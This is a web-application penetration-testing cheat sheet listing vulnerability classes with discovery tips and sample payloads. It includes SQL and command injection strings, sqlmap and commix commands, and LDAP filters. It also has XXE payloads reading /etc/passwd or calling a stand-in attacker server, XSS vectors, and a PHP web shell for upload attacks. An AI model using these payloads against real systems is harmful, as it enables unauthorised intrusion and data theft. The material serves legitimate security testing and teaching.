# 1. Injection Attacks 💉

## 1.1 SQL Injection(SQLi) :

Inject malicious SQL queries to access, modify, or delete database data.  
**Discovery Path** :

- URL Parameters (?id=1)
- Form Fields (login,search,contact forms)
- HTTP Header (User-Agent, Referer)

**Common payload** :

- basic ( `?id=1' --` , `?id=1' AND '1'='1` )
- Error based ( `?id=1"` , `?id=1 AND 1=CONVERT(int, (SELECT @@version))` )
- Time based in MySql ( `?id=1' AND SLEEP(5) --` )
- Time based in MsSql ( `?id=1'; WAITFOR DELAY '0:0:5' --` )
- sqlmap command ( `sqlmap -u "http://example.com/page.php?id=1" --batch --dbs` )
- Bypass Authentication ( `' OR '1'='1` , `' OR 1=1--` )

## 1.2 Command Injection :

Execute arbitrary system-level commands on the server. Look for input fields or URLs that interact with system-level commands.  
**Discovery Path** :

- Search Box
- Ping/Traceroute utilities
- File upload/rename/delete functions
- URL Parameters like: ( ?host=, ?ip=, ?cmd=, ?target= )

**Common payload** :

- linux ( `127.0.0.1; whoami` )
- window ( `127.0.0.1 && whoami` )
- linux delay ( `127.0.0.1; sleep 5` )
- windows delay ( `127.0.0.1 & ping -n 6 127.0.0.1` )
- Commix command ( `commix --url="http://example.com/page?host=127.0.0.1" --level=2` )

## 1.3 LDAP Injection :

Manipulate LDAP queries to bypass authentication or access data.  
**Discovery Path** :

- Search fields (e.g., employee name, email, department)
- Login or lookup functions
- URLParameters like: ( username=, filter=, search= )

**Common Payload** :

- Always true ( `admin*)(&)` )
- Add new one ( `*)(uid=*)` )
- And Or Condition ( `admin)(|(uid=*))` )

## 1.4 XML External Entity (XXE) :

Exploit XML parsers to disclose internal files or SSRF attacks.  
**Discovery Path**:

- Capture a POST request with XML data.
- Add the XXE payload in the body.
- Forward and monitor the response or OOB DNS logs.

**Common Payload**:

- In-Bind attack <pre> `xml <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <user> <name>&xxe;</name> </user> ` </pre>
- Out-of-Bind Attack <pre> `<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://your-server.com/xxe.txt" >]> <user> <name>&xxe;</name> </user> ` </pre>

---

# 2. Authentication and Authorization Issues 🔐

## 2.1 Broken Authentication :

Exploit weak or flawed authentication mechanisms to gain unauthorized access.  
**Discovery Path**:

- Login endpoints with username and password
- Password reset or forgot password forms
- Session management (tokens, cookies)

**Common Payloads / Techniques**:

- Brute-force login using wordlists (`admin:admin`, `user:123456`)
- Bypass logic flaws (e.g., send only username, empty password)
- Replay expired or predictable session tokens
- Use default credentials (admin/admin)

## 2.2 Broken Access Control :

Access resources or perform actions that should be restricted.  
**Discovery Path**:

- Endpoints that return user-specific data (`/user?id=123`)
- Admin-only or role-specific panels (`/admin`, `/config`)
- Hidden UI elements (inspect via browser DevTools)

**Common Payloads / Techniques**:

- IDOR test: change `user_id=1` to `user_id=2` in URLs or POST data
- Manually access `/admin`, `/manage/users` without proper role
- Remove or modify `isAdmin=false` in requests
- Use Burp’s “Parameter Pollution” to escalate permissions

## 2.3 Account Takeover (ATO) :

Gain control of another user's account via insecure flows.  
**Discovery Path**:

- Weak or predictable password reset tokens
- Email or phone change features
- Insecure OAuth or 2FA implementations

**Common Payloads / Techniques**:

- Capture and reuse password reset link from intercepted email
- Bruteforce or guess token values (`/reset?token=1234`)
- Change email to attacker’s without re-authentication
- Session fixation: login a victim to attacker’s session

---

# 3. Cross-Site Scripting (XSS) 🛠️

## 3.1 Reflected XSS :

Malicious script is reflected in the response and executed immediately.  
**Discovery Path**:

- URL parameters (`?q=`, `?search=`)
- GET or POST form inputs
- Error messages or status alerts

**Common Payloads**:

- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg/onload=alert(1)>`
- `"><script>alert(document.domain)</script>`
- `<iframe src="javascript:alert(1)">`

## 3.2 Stored XSS :

Malicious input is permanently stored on the server and executed when viewed.  
**Discovery Path**:

- Comment sections
- Profile bio / About Me
- Chat systems, forums, admin dashboards

**Common Payloads**:

- `<script>alert('StoredXSS')</script>`
- `<img src=x onerror=confirm('XSS')>`
- `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`

## 3.3 DOM-Based XSS :

Client-side JavaScript dynamically injects or executes unsanitized input.  
**Discovery Path**:

- Look for JS handling of `location.hash`, `document.URL`, `location.search`
- Interact with URL fragments (`#name=evil`) or parameters

**Common Payloads**:

- `#<img src=x onerror=alert(1)>`
- `?input=<svg/onload=alert(1)>`
- `<a href="/page#"><script>alert(1)</script></a>`

---

# 4. Information Disclosure 📚

## 4.1 Sensitive Data Exposure :

Improper handling of sensitive information such as credentials, tokens, or PII.  
**Discovery Path**:

- API responses revealing sensitive info
- Tokens stored in `localStorage` / `sessionStorage`
- Exposed `.env`, `.bak`, `.git`, or config files
- HTTP (insecure) instead of HTTPS

**Common Findings**:

- Hardcoded API keys or secrets in frontend JS
- JWTs without `exp` (expiry) or weak signing
- Plaintext passwords in responses or logs
- Base64 encoded sensitive data (check and decode)

## 4.2 Server Error Messages :

Verbose error responses leak backend internals.  
**Discovery Path**:

- Trigger input validation or type conversion errors
- Use special characters like `'`, `"`, `<`, `{{}}`, `}}`, `[]`

**Common Payloads / Examples**:

- `'` → SQL error trace (e.g., `You have an error in your SQL syntax`)
- `<%` or `{{` → Template injection errors (e.g., Mustache, Handlebars)
- Full stack trace showing file paths, version numbers, or DB queries

## 4.3 Source Code Disclosure :

Accidental exposure of source code or sensitive project files.  
**Discovery Path**:

- Access backup or temp files (`index.php~`, `config.bak`)
- Access open directories or version control folders
- Fuzz file extensions using wordlists or tools like `feroxbuster`, `dirsearch`

**Common Payloads / Paths**:

- `/.git/config`
- `/backup.zip`, `/db.sql`
- `/config.old`, `/admin.bak`
- `/.env` (contains credentials)

---

# 5. File Upload Vulnerabilities 📤

## 5.1 Unrestricted File Upload :

Improper file validation allows attackers to upload malicious files (e.g., shells, scripts).  
**Discovery Path**:

- Profile picture uploads
- Document upload features (resume, PDF, etc.)
- Support ticket systems with attachments
- Web-based file managers

**Common Payloads**:

- PHP Web Shell: `<?php system($_GET['cmd']); ?>` saved as `shell.php`
- Double extension: `shell.php.jpg`, `exploit.jpg.php`
- Rename file via Burp and remove validation: `shell.php` ➝ Content-Type: `image/jpeg`

**Test**:

- Upload file and access via `https://target.com/uploads/shell.php`
- If blocked, try changing headers or file extension

## 5.2 Content-Type Bypass :

Bypass MIME-type or content-type filters used to restrict dangerous file types.  
**Discovery Path**:

- Intercept file upload in Burp
- Change `Content-Type`, `filename`, and `extension`
- Test with multiple upload points

**Common Payloads**:

- Change `Content-Type: image/png` while sending PHP script
- Filename tricks: `file.php.jpg`, `file.ph%00p`, `file.PHP`
- Upload .htaccess to allow execution:

---

# 6. Security Misconfigurations 👨‍🔧

## 6.1 Default Credentials :

Web apps still use default admin/admin or known vendor credentials.

## 6.2 Directory Listing Enabled :

Exposes directory contents that may contain sensitive or unused files.

## 6.3 Open Admin Panels :

Admin interfaces accessible without authentication or rate limiting.

---

# 7. Vulnerable Components 📦

## 7.1 Outdated Libraries/Plugins :

Known vulnerabilities in old versions of software, CMS plugins, JS libraries.

## 7.2 CVE Exploitation :

Use public exploits against unpatched components.

---

# 8. Business Logic Vulnerabilities 📈

## 8.1 Logic Flaws :

Break application flow to bypass steps (e.g., checkout without payment).

## 8.2 Price Manipulation :

Change item prices client-side before purchase.

## 8.3 Coupon Abuse :

Reuse or stack discount codes due to poor validation.

---

# 9. Cross-Site Request Forgery (CSRF) 🌐

## 9.1 CSRF on Critical Actions :

Trick users into performing actions without consent by abusing session cookies.

---

# 10. Server-Side Request Forgery (SSRF) 🌍

## 10.1 SSRF to Internal Systems :

Force server to fetch internal URLs (e.g., metadata endpoints, localhost).

---

# 11. Token-Related Vulnerabilities 🔑

## 11.1 Insecure JWT Handling :

Weakly signed or non-expiring tokens used for authentication.

## 11.2 Token Reuse or Prediction :

Access or guess valid session or API tokens.

---

# 12. Client-Side Attacks 📡

## 12.1 Clickjacking :

Trick users into clicking hidden elements using transparent iframes.

## 12.2 CORS Misconfigurations :

Improper CORS policies allow cross-origin data leaks or access.

---

# 13. Local and Remote File Inclusion 📁

## 13.1 Local File Inclusion (LFI) :

Read local server files using directory traversal (e.g., ../../etc/passwd).

## 13.2 Remote File Inclusion (RFI) :

Load external malicious scripts into the application.

---

# 14. Rate Limiting & DoS ⏱️

## 14.1 Lack of Rate Limiting :

Brute-force login, password reset, or OTP endpoints without being blocked.

## 14.2 Resource Exhaustion :

Crash or slow down the app by sending huge payloads or excessive requests.
